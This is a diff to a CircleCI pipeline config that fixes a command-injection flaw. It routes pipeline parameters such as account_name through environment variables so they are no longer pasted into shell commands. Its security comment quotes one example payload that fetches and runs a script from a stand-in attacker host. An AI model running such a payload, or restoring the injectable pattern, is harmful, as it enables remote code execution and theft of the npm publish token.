@@ -90,17 +90,46 @@ jobs:
   # build uses, since this job runs automatically and often), builds, and
   # publishes. Reports success/failure back to agnt-backend either way so the
   # PortalCliPublish record (and the console's CLI tab) reflects the outcome.
+  #
+  # SECURITY: account_name (and, defense-in-depth, every other pipeline
+  # parameter this job uses) is passed via `environment:` below and read as
+  # a shell env var ("$ACCOUNT_NAME", quoted), NOT interpolated directly into
+  # a `command:` string as `<< pipeline.parameters.account_name >>`.
+  #
+  # CircleCI substitutes `<<...>>` pipeline-parameter syntax into `command:`
+  # text as raw, unescaped characters BEFORE the shell ever runs — so a
+  # value like `$(curl evil.com | bash)` gets pasted verbatim into the
+  # script and executed, even inside double quotes, because the substitution
+  # happens at config-compile time, not as a shell-safe argument. account_name
+  # is free text set by any ordinary account owner (agnt-backend's
+  # portalCliPublishController triggers this pipeline with it), so this WAS
+  # exploitable by any self-serve account with the CLI enabled — full RCE in
+  # this job's container, with access to NPM_TOKEN (publish rights to the
+  # entire @agnt-sdk npm scope) and the release/webhook secrets.
+  #
+  # `environment:` values are also compile-time-substituted from pipeline
+  # parameters, but the result becomes the literal VALUE of an env var, not
+  # text spliced into a command the shell re-parses — so a malicious
+  # account_name just ends up as an inert string in $ACCOUNT_NAME. Do NOT
+  # reintroduce `<< pipeline.parameters.* >>` inside any `command:`/`run:`
+  # shell block in this file — route it through `environment:` instead, same
+  # as this job does now.
   hydrate_build_publish:
     docker:
       - image: cimg/node:20.11
+    environment:
+      ACCOUNT_SLUG: << pipeline.parameters.account_slug >>
+      ACCOUNT_NAME: << pipeline.parameters.account_name >>
+      BUILD_ID: << pipeline.parameters.build_id >>
+      WEBHOOK_URL: << pipeline.parameters.webhook_url >>
     steps:
       - checkout
       - run:
           name: Hydrate with the real account
           command: |
             node scripts/hydrate.mjs \
-              --account-slug "<< pipeline.parameters.account_slug >>" \
-              --account-name "<< pipeline.parameters.account_name >>"
+              --account-slug "$ACCOUNT_SLUG" \
+              --account-name "$ACCOUNT_NAME"
       - run:
           name: Install
           command: npm ci
@@ -139,18 +168,18 @@ jobs:
           when: on_success
           command: |
             VERSION=$(node -p "require('./packages/portal-cli/package.json').version")
-            curl -sf -X POST "<< pipeline.parameters.webhook_url >>" \
+            curl -sf -X POST "$WEBHOOK_URL" \
               -H "x-webhook-secret: ${CIRCLECI_WEBHOOK_SECRET}" \
               -H "Content-Type: application/json" \
-              -d "{\"buildId\":\"<< pipeline.parameters.build_id >>\",\"status\":\"success\",\"npmPackageVersion\":\"$VERSION\"}"
+              -d "{\"buildId\":\"$BUILD_ID\",\"status\":\"success\",\"npmPackageVersion\":\"$VERSION\"}"
       - run:
           name: Report failure
           when: on_fail
           command: |
-            curl -sf -X POST "<< pipeline.parameters.webhook_url >>" \
+            curl -sf -X POST "$WEBHOOK_URL" \
               -H "x-webhook-secret: ${CIRCLECI_WEBHOOK_SECRET}" \
               -H "Content-Type: application/json" \
-              -d "{\"buildId\":\"<< pipeline.parameters.build_id >>\",\"status\":\"failed\",\"error\":\"build or publish step failed — see CircleCI logs\"}"
+              -d "{\"buildId\":\"$BUILD_ID\",\"status\":\"failed\",\"error\":\"build or publish step failed — see CircleCI logs\"}"
 
 workflows:
   build-and-test:
